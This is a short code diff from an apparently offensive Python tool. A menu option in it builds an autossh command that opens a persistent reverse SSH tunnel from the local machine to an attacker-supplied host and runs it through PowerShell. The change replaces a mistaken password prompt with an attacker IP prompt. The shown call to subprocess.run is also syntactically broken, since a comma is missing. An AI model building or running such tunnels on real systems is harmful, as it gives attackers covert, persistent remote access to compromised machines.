@@ -131,9 +131,9 @@ while True:
     if action == "3":
         #stating the PS comand to persistent SSH tunnel
         sshuser=input("Enter attacker SSH username: ")
-        sshpass=input("Enter attacker SSH password: ")
+        userip=input("Enter attacker IP (without port): ")
         
-        ssh_tunnel="autossh -M 0 -R 8080:localhost:4444 "+sshuser+"@"+sshpass
+        ssh_tunnel="autossh -M 0 -R 8080:localhost:4444 "+sshuser+"@"+userip
         subprocess.run(["powershell", "-Command", ssh_tunnel] check=True)
         cls()
         print(Fore.YELLOW + "Attempting to connect to attacker on " + sshuser)
